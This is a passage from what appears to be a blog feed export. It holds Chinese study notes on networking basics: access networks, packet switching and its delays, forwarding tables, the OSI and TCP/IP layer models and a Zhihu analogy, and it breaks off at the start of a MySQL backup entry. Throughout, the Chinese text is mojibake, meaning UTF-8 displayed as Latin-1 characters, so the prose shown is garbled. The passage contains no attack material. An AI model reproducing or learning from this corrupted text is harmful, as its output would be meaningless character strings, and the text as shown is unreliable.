<li>ç”µç¼†ï¼ˆHFC,æ··åˆå…‰çº¤åŒè½´ç”µç¼†ç½‘ï¼‰ã€‚é€šè¿‡æœ‰çº¿ç”µè§†ç½‘ç»œè¿›è¡Œä¼ è¾“ï¼Œç”¨cable modemï¼ˆå³â€œçŒ«â€ï¼‰å°†ç”µè§†ä¿¡å·ä¸ç½‘ç»œä¿¡å·åˆ†å¼€ã€‚è¿™ä¹Ÿæ˜¯éå¯¹ç§°çš„ï¼Œä¸‹è¡Œé€šå¸¸åˆ°30Mbtsï¼Œä¸Šè¡Œä¸º2Mbps</li>
<li>å…‰çº¤åˆ°æˆ·ã€‚æœ¬åœ°ä¸­å¿ƒå±€ç›´æ¥æä¾›äº†ä¸€æ¡å…‰çº¤çº¿è·¯åˆ°å®¶åº­ã€‚</li>
<li>LAN æ— é™å±€åŸŸç½‘ã€‚åœ¨å…¬å¸ã€å¤§å­¦å’Œè¶Šæ¥è¶Šå¤šçš„å®¶åº­ç¯å¢ƒä¸­ï¼Œé€šå¸¸æ˜¯ç”¨å±€åŸŸç½‘(LAN)å°†ç«¯ç³»ç»Ÿè¿æ¥åˆ°è¾¹ç¼˜è·¯ç”±å™¨ã€‚å°½ç®¡æœ‰å¤šç§ä¸åŒçš„å±€åŸŸç½‘æŠ€æœ¯ï¼Œä½†<code>ä»¥å¤ªç½‘</code>æ˜¯ç›®å‰æœ€æµè¡Œçš„æ¥å…¥æŠ€æœ¯ã€‚åœ¨æ— çº¿LANç¯å¢ƒä¸­ï¼Œæ— çº¿ç”¨æˆ·ä»ä¸€ä¸ªæ¥å…¥ç‚¹å‘é€/æ¥å—åˆ†ç§Ÿï¼Œæ¥å…¥ç‚¹ä¸ä¼ä¸šç½‘è¿æ¥ï¼Œè¯¥ä¼ä¸šç½‘å†ä¸æœ‰çº¿å› ç‰¹ç½‘ç›¸è¿ï¼Œè¿™å°±æ˜¯ wifiã€‚å¯è¾¾ 54Mbps</li>
<li>èœ‚çªç½‘ã€‚èœ‚çªç½‘ä¹Ÿå±äºæ— çº¿æ¥å…¥ã€‚æ‰€è°“3Gç½‘4Gç½‘éƒ½å±äºèœ‚çªç½‘ã€‚</li>
</ul>
<h2 id="ç½‘ç»œæ ¸å¿ƒ"><a href="#ç½‘ç»œæ ¸å¿ƒ" class="headerlink" title="ç½‘ç»œæ ¸å¿ƒ"></a>ç½‘ç»œæ ¸å¿ƒ</h2><p><code>ç½‘ç»œæ ¸å¿ƒ</code>å³äº’è”å› ç‰¹ç½‘ç«¯ç³»ç»Ÿçš„åˆ†ç»„äº¤æ¢æœºå’Œé“¾è·¯æ„æˆçš„ç½‘çŠ¶ç½‘ç»œã€‚</p>
<p>ç½‘ç»œæ ¸å¿ƒçš„å…³é”®åŠŸèƒ½æ˜¯<code>è·¯ç”±</code>+<code>è½¬å‘</code>ã€‚<code>è·¯ç”±</code>å³ç¡®å®šåˆ†ç»„ä»æºåˆ°ç›®çš„åœ°çš„è·¯å¾„ã€‚</p>
<h3 id="å­˜å‚¨è½¬å‘ä¼ è¾“"><a href="#å­˜å‚¨è½¬å‘ä¼ è¾“" class="headerlink" title="å­˜å‚¨è½¬å‘ä¼ è¾“"></a>å­˜å‚¨è½¬å‘ä¼ è¾“</h3><p>å¤šæ•°åˆ†ç»„äº¤æ¢æœºåœ¨é“¾è·¯çš„è¾“å…¥ç«¯ç”¨<code>å­˜å‚¨è½¬å‘ä¼ è¾“æœºåˆ¶</code>ï¼šäº¤æ¢æœºèƒ½å¤Ÿåœ¨å¼€å§‹å‘è¾“å‡ºé“¾è·¯ä¼ è¾“è¯¥åˆ†ç»„çš„ç¬¬ä¸€ä¸ªæ¯”ç‰¹ä¹‹å‰ï¼Œå¿…é¡»æ¥æ”¶åˆ°æ•´ä¸ªåˆ†ç»„ã€‚ç”±æ­¤å­˜åœ¨<code>å­˜å‚¨è½¬å‘å»¶æ—¶</code>ï¼šå¦‚æœæŸæºç«¯ç³»ç»Ÿæˆ–åˆ†ç»„äº¤æ¢æœºç»è¿‡ä¸€æ¡é“¾è·¯å‘é€ä¸€ä¸ªLæ¯”ç‰¹çš„åˆ†ç»„ï¼Œé“¾è·¯çš„ä¼ è¾“é€Ÿç‡ä¸ºR bit/sï¼Œåˆ™åˆ†ç»„åœ¨è¿™æ¡é“¾è·¯ä¸Šçš„ä¼ è¾“æ—¶é—´ä¸º L/R ç§’ã€‚</p>
<h3 id="æ’é˜Ÿå»¶æ—¶å’Œä¸¢åŒ…"><a href="#æ’é˜Ÿå»¶æ—¶å’Œä¸¢åŒ…" class="headerlink" title="æ’é˜Ÿå»¶æ—¶å’Œä¸¢åŒ…"></a>æ’é˜Ÿå»¶æ—¶å’Œä¸¢åŒ…</h3><p>æ¯ä¸ªåˆ†ç»„äº¤æ¢æœºæœ‰å¤šæ¡é“¾è·¯ä¸ä¹‹ç›¸è¿ã€‚å¯¹äºæ¯æ¡ç›¸è¿çš„é“¾è·¯ï¼Œè¯¥åˆ†ç»„äº¤æ¢æœºæœ‰ä¸€ä¸ª<code>è¾“å‡ºç¼“å­˜</code>ç”¨äºå­˜å‚¨è·¯ç”±å™¨å‡†å¤‡å‘å¾€é‚£æ¡é“¾è·¯çš„åˆ†ç»„ã€‚å¦‚æœåˆ°è¾¾çš„åˆ†ç»„éœ€è¦ä¼ è¾“åˆ°æŸå¤©é“¾è·¯ä½†å‘ç°è¯¥é“¾è·¯æ­£å¿™äºä¼ è¾“å…¶ä»–åˆ†ç»„ï¼Œè¯¥åˆ°è¾¾åˆ†ç»„å¿…é¡»åœ¨è¾“å‡ºç¼“å­˜ä¸­ç­‰å¾…ï¼Œç”±æ­¤åˆ†ç»„åˆå­˜åœ¨<code>æ’é˜Ÿå»¶æ—¶</code>ã€‚ç¼“å­˜ç©ºé—´æ˜¯æœ‰é™çš„ï¼Œä¸€ä¸ªåˆ°è¾¾çš„åˆ†ç»„å¯èƒ½å‘ç°è¯¥ç¼“å­˜å·²æ»¡ï¼Œæ­¤æ—¶ä¼šå‘ç”Ÿ<code>ä¸¢åŒ…(åˆ†ç»„ä¸¢å¤±)</code>ï¼šåˆ°è¾¾çš„åˆ†ç»„æˆ–æ­£æ’é˜Ÿçš„åˆ†ç»„ä¹‹ä¸€ä¼šè¢«ä¸¢å¼ƒã€‚</p>
<h3 id="è½¬å‘è¡¨å’Œè·¯ç”±é€‰æ‹©åè®®"><a href="#è½¬å‘è¡¨å’Œè·¯ç”±é€‰æ‹©åè®®" class="headerlink" title="è½¬å‘è¡¨å’Œè·¯ç”±é€‰æ‹©åè®®"></a>è½¬å‘è¡¨å’Œè·¯ç”±é€‰æ‹©åè®®</h3><p>åœ¨å› ç‰¹ç½‘ä¸­ï¼Œæ¯ä¸ªç«¯ç³»ç»Ÿå…·æœ‰ä¸€ä¸ªè¢«ç§°ä¸º<code>IPåœ°å€</code>çš„åœ°å€ã€‚å½“æºä¸»æœºè¦å‘ç›®çš„åœ°ç«¯ç³»ç»Ÿå‘é€ä¸€ä¸ªåˆ†ç»„æ—¶ï¼Œæºåœ¨è¯¥åˆ†ç»„çš„é¦–éƒ¨åŒ…å«äº†ç›®çš„åœ°çš„ IP åœ°å€ã€‚å¦‚åŒé‚®æ”¿åœ°å€é‚£æ ·ï¼Œè¯¥åœ°å€å…·æœ‰ä¸€ç§ç­‰çº§ç»“æ„ã€‚å½“ä¸€ä¸ªåˆ†ç»„åˆ°è¾¾ç½‘ç»œä¸­çš„è·¯ç”±å™¨æ—¶ï¼Œè·¯ç”±å™¨æ£€æŸ¥è¯¥åˆ†ç»„çš„ç›®çš„åœ°åœ°å€çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶å‘ä¸€å°ç›¸é‚»è·¯ç”±å™¨è½¬å‘è¯¥åˆ†ç»„ã€‚æ›´ç‰¹åˆ«çš„æ˜¯ï¼Œæ¯å°è·¯ç”±å™¨å…·æœ‰ä¸€ä¸ª<code>è½¬å‘è¡¨</code>ï¼Œç”¨äºå°†ç›®çš„åœ°å€æ˜ å°„ä¸ºè¾“å‡ºé“¾è·¯ã€‚å½“æŸåˆ†ç»„åˆ°è¾¾ä¸€å°è·¯ç”±å™¨æ—¶ï¼Œè·¯ç”±å™¨æ£€æŸ¥è¯¥åœ°å€ï¼Œå¹¶ç”¨è¿™ä¸ªç›®çš„åœ°å€æœç´¢å…¶è½¬å‘è¡¨ï¼Œä»¥å‘è¡Œé€‚å½“çš„å‡ºé“¾è·¯ã€‚è·¯ç”±å™¨åˆ™å°†åˆ†ç»„å¯¼å‘è¯¥å‡ºé“¾è·¯ã€‚</p>
<h2 id="åˆ†ç»„äº¤æ¢æ—¶å»¶"><a href="#åˆ†ç»„äº¤æ¢æ—¶å»¶" class="headerlink" title="åˆ†ç»„äº¤æ¢æ—¶å»¶"></a>åˆ†ç»„äº¤æ¢æ—¶å»¶</h2><p>åˆ†ç»„ä»ä¸€ä¸ªä¸»æœºå‡ºå‘é€šè¿‡ä¸€ç³»åˆ—è·¯ç”±å™¨ä¼ è¾“ï¼Œåœ¨å¦ä¸€å°ä¸»æœºä¸­ç»“æŸå®ƒçš„å†ç¨‹ã€‚è¿™ä¸ªè¿‡ç¨‹æ˜¯å­˜åœ¨æ—¶å»¶çš„ã€‚å…¶ä¸­æœ€ä¸ºé‡è¦çš„å‡ ç§æ—¶å»¶æ˜¯<code>èŠ‚ç‚¹å¤„ç†æ—¶å»¶</code>ã€<code>æ’é˜Ÿæ—¶å»¶</code>ã€<code>ä¼ è¾“æ—¶å»¶</code>ã€<code>ä¼ æ’­æ—¶å»¶</code>ã€‚è¿™äº›å»¶æ—¶åŠ èµ·æ¥ç§°ä¸º<code>èŠ‚ç‚¹æ€»æ—¶å»¶</code></p>
<ul>
<li>èŠ‚ç‚¹å¤„ç†æ—¶å»¶ï¼ˆnodal processing delayï¼‰ã€‚é€ æˆè¿™éƒ¨åˆ†æ—¶å»¶çš„åŸå› ä¸»è¦æ˜¯æ£€æŸ¥åˆ†ç»„é¦–éƒ¨ï¼ˆå·®é”™æ£€æµ‹ï¼‰å’Œå†³å®šå°†è¯¥åˆ†ç»„å¯¼å‘ä½•å¤„ï¼ˆç¡®å®šè¾“å‡ºé“¾è·¯ï¼‰</li>
<li>æ’é˜Ÿæ—¶å»¶ï¼ˆqueueing delayï¼‰ã€‚é“¾è·¯ç¹å¿™æ—¶æ–°åˆ°è¾¾äº¤æ¢æœºçš„åˆ†ç»„ä¼šè¿›å…¥æ’é˜ŸçŠ¶æ€ã€‚</li>
<li>ä¼ è¾“æ—¶å»¶ï¼ˆtransmission delayï¼‰ã€‚ä»…å½“æ‰€æœ‰å…ˆåˆ°è¾¾çš„åˆ†ç»„ä¼ è¾“å®Œæ¯•åæ‰èƒ½ä¼ è¾“åˆšåˆ°è¾¾çš„åˆ†ç»„ã€‚ä¼ è¾“æ—¶å»¶æ˜¯å°†è¯¥åˆ†ç»„çš„æ‰€æœ‰æ¯”ç‰¹æ¨å‘é“¾è·¯æ‰€éœ€è¦çš„æ—¶é—´ã€‚L ä¸ºåˆ†ç»„é•¿åº¦ï¼ŒR ä¸ºé“¾è·¯å¸¦å®½ï¼Œåˆ™ä¼ è¾“æ—¶å»¶ä¸º L/R</li>
<li>ä¼ æ’­æ—¶å»¶ï¼ˆpropagation delayï¼‰ã€‚åˆ†ç»„åœ¨é“¾è·¯ä¸Šä¼ æ’­çš„æ—¶é—´ç§°ä¸ºä¼ æ’­æ—¶å»¶ã€‚d ä¸ºé“¾è·¯é•¿åº¦ï¼Œv ä¸ºä¼ æ’­é€Ÿç‡ï¼Œåˆ™ä¼ æ’­æ—¶å»¶ä¸º d/v</li>
</ul>
<p>ä¼ è¾“æ—¶å»¶ä¸ä¼ æ’­æ—¶å»¶ä¸åŒä¹‹å¤„åœ¨äºä¼ è¾“æ—¶å»¶æ˜¯åˆ†ç»„ä»äº¤æ¢æœºåˆ°é“¾è·¯çš„æ—¶é—´ï¼Œä¸åˆ†ç»„çš„å¤§å°æœ‰å…³ï¼Œä¸ä¸¤å°è·¯ç”±å™¨ä¹‹é—´çš„è·ç¦»æ— å…³ã€‚è€Œä¼ æ’­æ—¶å»¶æ˜¯åˆ†ç»„åœ¨é“¾æ¥ä¸Šä¼ æ’­æ¶ˆè€—çš„æ—¶é—´ï¼Œä¸åˆ†ç»„å¤§å°æ— å…³ï¼Œä¸è·ç¦»æœ‰å…³ã€‚</p>
<h2 id="OSIä¸ƒå±‚åè®®"><a href="#OSIä¸ƒå±‚åè®®" class="headerlink" title="OSIä¸ƒå±‚åè®®"></a>OSIä¸ƒå±‚åè®®</h2><p>æ¯å±‚å®Œæˆä¸€ç±»ç‰¹å®šåŠŸèƒ½ï¼Œåº•å±‚ä¸ºä¸Šå±‚æä¾›æœåŠ¡ï¼Œç›¸é‚»çš„ä¸¤å±‚é€šè¿‡<code>æ¥å£</code>è¿›è¡Œäº¤äº’ï¼Œä»»ä¸€å±‚å®ä½“æä¾›çš„æœåŠ¡æ˜¯<code>å‚ç›´çš„</code>ã€‚</p>
<p>è®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„æ˜¯è®¡ç®—æœºç½‘ç»œå„å±‚åŠå…¶åè®®çš„é›†åˆã€‚<strong>åè®®æ˜¯æ§åˆ¶ä¸¤ä¸ªå¯¹ç­‰å®ä½“è¿›è¡Œé€šä¿¡çš„è§„åˆ™</strong>çš„é›†åˆï¼Œåè®®æ˜¯<code>æ°´å¹³çš„</code>ã€‚</p>
<p><img src="https://i.loli.net/2020/01/19/JHuDU5ys3oX84IC.png" alt="OSIæ¨¡å‹é€šä¿¡è¿‡ç¨‹"></p>
<p>ä¸­é—´ç³»ç»Ÿåªå®ç°ç½‘ç»œå±‚ã€é“¾è·¯å±‚å’Œç‰©ç†å±‚ï¼Œè¿™ä¸‰å±‚åˆç§°â€œéç«¯åˆ°ç«¯å±‚(non-end-end)â€ã€‚</p>
<h3 id="å°è£…"><a href="#å°è£…" class="headerlink" title="å°è£…"></a>å°è£…</h3><p>æ•°æ®åœ¨æ¯ä¸€å±‚éƒ½ä¼šè¢«æ‰“ä¸Šä¸€ä¸ªè¯¥å±‚çš„é™„åŠ ä¿¡æ¯ï¼ˆæ‰€è°“è¿è¾“é¦–éƒ¨ä¿¡æ¯ï¼‰ï¼Œç§°ä¸º PDU(Protocol Data Unit)ã€‚è€Œè¿™äº›ä¿¡æ¯ä¼šåœ¨ä¸‹ä¸€å±‚è¢«ä½¿ç”¨ã€‚</p>
<p><img src="https://i.loli.net/2020/01/19/zK7oIaJw41ncGgY.png" alt="OSIæ¨¡å‹å°è£…è¿‡ç¨‹"></p>
<h3 id="ä¸ºä»€ä¹ˆè¦å°è£…"><a href="#ä¸ºä»€ä¹ˆè¦å°è£…" class="headerlink" title="ä¸ºä»€ä¹ˆè¦å°è£…"></a>ä¸ºä»€ä¹ˆè¦å°è£…</h3><ul>
<li>å¢åŠ æ§åˆ¶ä¿¡æ¯ï¼šåœ°å€ä¿¡æ¯ï¼ˆè¡¨ç¤ºå‘é€ã€æ¥å—ç«¯ï¼‰ï¼Œå·®é”™æ£€æµ‹ç¼–ç ï¼Œä¼˜å…ˆçº§è®¾ç½®ç­‰</li>
</ul>
<h3 id="éç«¯åˆ°ç«¯å±‚"><a href="#éç«¯åˆ°ç«¯å±‚" class="headerlink" title="éç«¯åˆ°ç«¯å±‚"></a>éç«¯åˆ°ç«¯å±‚</h3><h4 id="ç‰©ç†å±‚"><a href="#ç‰©ç†å±‚" class="headerlink" title="ç‰©ç†å±‚"></a>ç‰©ç†å±‚</h4><ul>
<li>è§„èŒƒæ¥å£ç‰¹æ€§ï¼šæœºæ¢°ç‰¹æ€§ï¼ˆå½¢çŠ¶ï¼Œå¤§å°ï¼‰ã€ç”µæ°”ç‰¹æ€§ï¼ˆç”µå‹ã€ç”µé¢‘ï¼‰ï¼ŒåŠŸèƒ½ç‰¹æ€§ï¼ˆå¼•è„šï¼‰ç­‰</li>
<li>æ¯”ç‰¹ç¼–ç ï¼šå¦‚ä½•è¡¨ç¤º 0 å’Œ 1</li>
<li>æ•°æ®ç‡ï¼šæ•°æ®ä¼ è¾“é€Ÿç‡</li>
<li>ä¼ è¾“æ¨¡å¼ï¼šå•å·¥é€šä¿¡ï¼ˆå•å‘ï¼‰ï¼ŒåŠåŒå·¥é€šä¿¡ï¼ˆäº¤æ›¿å•å‘ï¼Œå‘å’Œæ”¶ä¸åŒæ—¶ï¼‰ï¼Œå…¨åŒå·¥é€šä¿¡ï¼ˆåŒæ—¶æ”¶å‘ï¼‰</li>
</ul>
<h4 id="é“¾è·¯å±‚"><a href="#é“¾è·¯å±‚" class="headerlink" title="é“¾è·¯å±‚"></a>é“¾è·¯å±‚</h4><ul>
<li>ä¸¤ä¸ªç›´æ¥ç›¸è¿çš„ç»“ç‚¹é—´çš„æ•°æ®å¸§ä¼ è¾“ã€‚</li>
<li>ç‰©ç†å¯»å€ã€‚åœ¨å¸§å¤´å¢åŠ æ”¶å‘ç«¯ç‰©ç†åœ°å€æ ‡è¯†ä¿¡æ¯ï¼ˆé€šå¸¸ä¸º MAC åœ°å€ï¼‰ã€‚</li>
<li>æµé‡æ§åˆ¶ã€‚åŒ¹é…å‘é€å’Œæ¥æ”¶é€Ÿåº¦ï¼Œé¿å…æ·¹æ²¡æ¥æ”¶ç«¯ã€‚</li>
<li>å·®é”™æ§åˆ¶ã€‚åˆ¤æ–­ä¸¢å¤±å¸§ä¸é‡å¤å¸§ã€‚</li>
<li>è®¿é—®æ§åˆ¶ã€‚å†³å®šå“ªä¸ªè®¾å¤‡æ‹¥æœ‰ç‰©ç†é“¾è·¯ä½¿ç”¨æƒã€‚</li>
</ul>
<h4 id="ç½‘ç»œå±‚"><a href="#ç½‘ç»œå±‚" class="headerlink" title="ç½‘ç»œå±‚"></a>ç½‘ç»œå±‚</h4><ul>
<li>è·¨è¶Šå¤šä¸ªç½‘ç»œçš„æ•°æ®åˆ†ç»„ä¼ è¾“</li>
<li>é€»è¾‘å¯»å€ï¼Œå…¨å±€å”¯ä¸€ï¼ˆé€šå¸¸ä¸º IP åœ°å€ï¼‰ã€‚</li>
<li>è·¯ç”±ï¼šè·¯å¾„é€‰æ‹©åŠåˆ†ç»„è½¬å‘ã€‚</li>
</ul>
<p><img src="https://i.loli.net/2020/01/19/Xjb7cGfD285kEev.png" alt="åˆ†ç»„è½¬å‘"></p>
<p>ç½‘ç»œå±‚åœ°å€ä¸å˜ï¼Œé“¾è·¯å±‚åœ°å€éšä¼ è¾“è¿‡ç¨‹ä¸æ–­æ›´æ–°ã€‚</p>
<h3 id="ç«¯åˆ°ç«¯å±‚"><a href="#ç«¯åˆ°ç«¯å±‚" class="headerlink" title="ç«¯åˆ°ç«¯å±‚"></a>ç«¯åˆ°ç«¯å±‚</h3><h4 id="ä¼ è¾“å±‚"><a href="#ä¼ è¾“å±‚" class="headerlink" title="ä¼ è¾“å±‚"></a>ä¼ è¾“å±‚</h4><p>æºåˆ°ç›®çš„ç«¯è¿›ç¨‹é—´æŠ¥æ–‡ä¼ è¾“ã€‚</p>
<ul>
<li>æŠ¥æ–‡åˆ†æ®µä¸é‡ç»„</li>
<li>ç«¯å£å·å¯»å€ï¼šç¡®ä¿å°†æŠ¥æ–‡æäº¤ç»™æ­£ç¡®è¿›ç¨‹ã€‚</li>
<li>è¿æ¥æ§åˆ¶ï¼šä½œä¸ºè‡ªä¸‹è€Œä¸Šç¬¬ä¸€ä¸ªç«¯åˆ°ç«¯å±‚æ¬¡ï¼Œå»ºç«‹æˆ–æ‹†é™¤ç«¯åˆ°ç«¯é—´çš„é€»è¾‘è¿æ¥ã€‚</li>
<li>æµé‡æ§åˆ¶</li>
<li>å·®é”™æ§åˆ¶ï¼ˆå¦‚ TCPï¼‰</li>
</ul>
<h4 id="ä¼šè¯å±‚"><a href="#ä¼šè¯å±‚" class="headerlink" title="ä¼šè¯å±‚"></a>ä¼šè¯å±‚</h4><p>ä¸å¯¹æ•°æ®è¿›è¡Œåˆ†æ®µï¼Œåªæ’å…¥ä¸€äº›ä¿¡æ¯ã€‚</p>
<ul>
<li>å¯¹è¯æ§åˆ¶ï¼šå»ºç«‹ã€ç»´æŠ¤è¿›ç¨‹é—´å¯¹è¯</li>
<li>åŒæ­¥ï¼šåœ¨æ•°æ®æµä¸­æ’å…¥åŒæ­¥ç‚¹ï¼Œä¾¿äºæ¢å¤å¯¹è¯</li>
</ul>
<h4 id="è¡¨ç¤ºå±‚"><a href="#è¡¨ç¤ºå±‚" class="headerlink" title="è¡¨ç¤ºå±‚"></a>è¡¨ç¤ºå±‚</h4><p>å¤„ç†ä¸¤ä¸ªç³»ç»Ÿé—´äº¤æ¢ä¿¡æ¯çš„è¯­æ³•è¯­ä¹‰é—®é¢˜ï¼ˆå¦‚å¤§å°ç«¯æœºå™¨å¯¹æ•°æ®çš„è¡¨ç¤ºæ–¹å¼ä¸åŒï¼‰ã€‚</p>
<ul>
<li>æ•°æ®è¡¨ç¤ºè½¬åŒ–ï¼šå‘é€ç«¯æŠŠä¿¡æ¯è½¬åŒ–ä¸ºä¸»æœºç‹¬ç«‹çš„ç¼–ç ï¼Œæ¥æ”¶ç«¯è½¬åŒ–ä¸ºä¸»æœºç›¸å…³ç¼–ç </li>
<li>åŠ å¯†è§£å¯†</li>
<li>å‹ç¼©è§£å‹ç¼©</li>
</ul>
<h4 id="åº”ç”¨å±‚"><a href="#åº”ç”¨å±‚" class="headerlink" title="åº”ç”¨å±‚"></a>åº”ç”¨å±‚</h4><p>å‘ç”¨æˆ·æä¾›ç½‘ç»œæœåŠ¡æ¥å£ï¼ˆå¦‚æµè§ˆå™¨ï¼‰ï¼Œæ ¹æ®ä¸åŒåº”ç”¨åœºæ™¯å¤„ç†ç”¨æˆ·æ•°æ®ã€‚</p>
<h2 id="TCP-IPå‚è€ƒæ¨¡å‹"><a href="#TCP-IPå‚è€ƒæ¨¡å‹" class="headerlink" title="TCP/IPå‚è€ƒæ¨¡å‹"></a>TCP/IPå‚è€ƒæ¨¡å‹</h2><p><img src="https://i.loli.net/2020/01/19/OMNn6oqPg4f9G7d.png" alt="TCP/IPæ¨¡å‹"></p>
<h2 id="Internetäº”å±‚åè®®"><a href="#Internetäº”å±‚åè®®" class="headerlink" title="Internetäº”å±‚åè®®"></a>Internetäº”å±‚åè®®</h2><p>ç»¼åˆ OSI ä¸ TCP/IP</p>
<ol>
<li>åº”ç”¨å±‚ã€‚åº”ç”¨å±‚æ˜¯ç½‘ç»œåº”ç”¨ç¨‹åºåŠä»–ä»¬çš„åº”ç”¨å±‚åè®®å­˜ç•™çš„åœ°æ–¹ã€‚HTTPã€SMTPã€FTPã€DNSç­‰éƒ½å±äºåº”ç”¨å±‚åè®®ã€‚åˆ†ç»„åœ¨åº”ç”¨å±‚ä¸­ç§°ä¸º<code>æŠ¥æ–‡</code></li>
<li>è¿è¾“å±‚ã€‚<strong>è¿›ç¨‹ä¹‹é—´</strong>ä¼ é€æŠ¥æ–‡ã€‚åœ¨å› ç‰¹ç½‘ä¸­æœ‰ä¸¤ä¸ªè¿è¾“åè®®<code>TCP</code>å’Œ<code>UDP</code>ã€‚åˆ†ç»„åœ¨è¿è¾“å±‚ä¸­ç§°ä¸º<code>æŠ¥æ–‡æ®µ</code></li>
<li>ç½‘ç»œå±‚ã€‚<strong>ä¸»æœºä¹‹é—´</strong>æ•°æ®åˆ†ç»„ä¸è½¬å‘ã€‚ç½‘ç»œå±‚æ¥å—è¿è¾“å±‚é€’äº¤çš„æŠ¥æ–‡æ®µå’Œç›®çš„åœ°å€ï¼Œç±»ä¼¼äºå¯„ä¿¡æ—¶è¦å‘é‚®å±€æä¾›ç›®æ ‡åœ°å€ã€‚è‘—åçš„<code>IPåè®®</code>å°±åœ¨ç½‘ç»œå±‚ã€‚è¯¥åè®®å®šä¹‰äº†æ•°æ®æŠ¥ä¸­çš„å„ä¸ªå­—æ®µåŠç«¯ç³»ç»Ÿå’Œè·¯ç”±å™¨å¦‚ä½•ä½œç”¨äºè¿™äº›å­—æ®µï¼Œä»¥è¾¾åˆ°<code>é€»è¾‘å¯»å€</code>çš„ç›®çš„ã€‚åˆ†ç»„åœ¨ç½‘ç»œå±‚ç§°ä¸º<code>æ•°æ®æŠ¥</code></li>
<li>é“¾è·¯å±‚ã€‚å°†ç½‘ç»œå±‚çš„IPæ•°æ®åŒ…ç»„è£…æˆå¸§ï¼ˆå¸§åŒ…å«æ•°æ®å’Œå¿…è¦çš„æ§åˆ¶ä¿¡æ¯ï¼Œä¾‹å¦‚ä¿¡é“ç¼–ç ï¼Œå·ç§¯ç ï¼Œturboç ï¼‰ï¼Œåœ¨<strong>ç›¸é‚»ç½‘ç»œå…ƒç´ </strong>ä¹‹é—´ä¼ è¾“ã€‚</li>
<li>ç‰©ç†å±‚ã€‚ç‰©ç†å±‚è´Ÿè´£å°†å¸§ä¸€ä¸ªæ¯”ç‰¹ä¸€ä¸ªæ¯”ç‰¹åœ°ä»ä¸€ä¸ªèŠ‚ç‚¹ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ã€‚è¿›ä¸€æ­¥ä¸é“¾è·¯å®ä½“ï¼ˆå¦‚åŒé€šé“œçº¿ã€å•æ¨¡å…‰ç¼†ï¼‰ç›¸å…³ã€‚ä¼ è¾“æ•°æ®ä¸ºæ¯”ç‰¹æµï¼Œç‰©ç†å±‚éœ€è¦å®šä¹‰æ¯”ç‰¹ä¼ è¾“çš„ç”µæ°”ç‰¹æ€§ï¼ˆå¤šå°‘ç”µå‹ä»£è¡¨1å¤šå°‘ä»£è¡¨0ï¼‰ã€æœºæ¢°ç‰¹æ€§ï¼ˆæ¥å£å½¢çŠ¶å°ºå¯¸ç­‰ï¼‰ï¼Œå¦‚USBã€Bluetoothç­‰ã€‚è€Œä¼ è¾“ç‰©ç†ä»‹è´¨å¦‚å…‰çº¤ã€åŒç»çº¿ç­‰å¹¶ä¸å¤„äºç‰©ç†å±‚çš„èŒƒç•´</li>
</ol>
<p><img src="https://i.loli.net/2020/01/19/i1bsCztfQAxcIyK.png" alt="äº”å±‚æ¨¡å‹æ•°æ®å°è£…"></p>
<p>ä¸‹é¢æ˜¯çŸ¥ä¹ä¸€ä¸ªæœ‰è¶£çš„ä¾‹å­ï¼š</p>
<blockquote>
<p>ä¸ºäº†å®ç°è·¨è¶Šäº’è”ç½‘çš„ï¼Œä¸»æœº A çš„è¿›ç¨‹ P1ï¼Œå’Œä¸»æœº B çš„è¿›ç¨‹ P2 ä¹‹é—´çš„é€šä¿¡ï¼Œæˆ‘ä»¬é€å±‚æŠŠè¿™ä¸ªä»»åŠ¡äº¤ç»™ TCP/IP åè®®æ ˆã€‚<br>è¿è¾“å±‚ï¼šâ€œå¦‚æœæœ‰äººèƒ½å¸®æˆ‘æŠŠæ•°æ®ä»æŸä¸ªç½‘ç»œä¸­çš„æœºå™¨ A æ¬åˆ°å¦ä¸€ä¸ªç½‘ç»œä¸­çš„æœºå™¨ Bï¼Œæˆ‘å°±å¯ä»¥æå®šè¿™ä¸ªä»»åŠ¡ï¼Œå› ä¸ºæˆ‘çŸ¥é“ä¸åŒçš„æ•°æ®åº”è¯¥äº¤ç»™æœºå™¨ä¸Šçš„å“ªä¸ªè¿›ç¨‹ã€‚â€<br>ç½‘ç»œå±‚ï¼šâ€œå¦‚æœæœ‰äººèƒ½å¸®æˆ‘æŠŠæ•°æ®ä»å±€åŸŸç½‘ä¸­ç›´æ¥ç›¸è¿çš„ä¸€å°æœºå™¨æ¬åˆ°å¦ä¸€å°æœºå™¨ï¼Œæˆ‘å°±å¯ä»¥æŠŠæ•°æ®ä»ä¸€ä¸ªç½‘ç»œæ¬åˆ°å¦ä¸€ä¸ªç½‘ç»œï¼Œå› ä¸ºæˆ‘çŸ¥é“è·¯çº¿æ€ä¹ˆèµ°ï¼Œè¦ç»è¿‡å“ªäº›èŠ‚ç‚¹ã€‚â€<br>é“¾è·¯å±‚ï¼šâ€œæˆ‘çŸ¥é“æ€æ ·åœ¨å±€åŸŸç½‘ä¸­æ¬æ•°æ®ï¼Œè¿˜èƒ½ç”¨ CSMA/CD åè®®åè°ƒå·¥ä½œï¼Œè¿˜èƒ½ç”¨ CRC32 æ ¡éªŒå‘é€çš„æ•°æ®å’Œæ¥æ”¶çš„æ•°æ®æ˜¯ä¸€è‡´çš„ï¼Œblablaâ€¦ Butï¼Œæˆ‘åªæ˜¯è¯´è¯´ï¼Œæˆ‘ä¸å¹²è‹¦åŠ›æ´»ã€‚â€<br>ç‰©ç†å±‚ï¼šâ€œæ¥¼ä¸Šçš„å¤§çˆ·ä»¬å‘è¯äº†ï¼Œå…„å¼Ÿä»¬ä¸Šã€‚â€</p>
</blockquote>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç½‘ç»œ</category>
      </categories>
      <tags>
        <tag>æ‚è°ˆ</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQLä¹‹å¤‡ä»½ä¸æ¢å¤</title>
    <url>/2018/06/03/%E3%80%8AMySQL%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E3%80%8B%E4%B9%8B%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/</url>
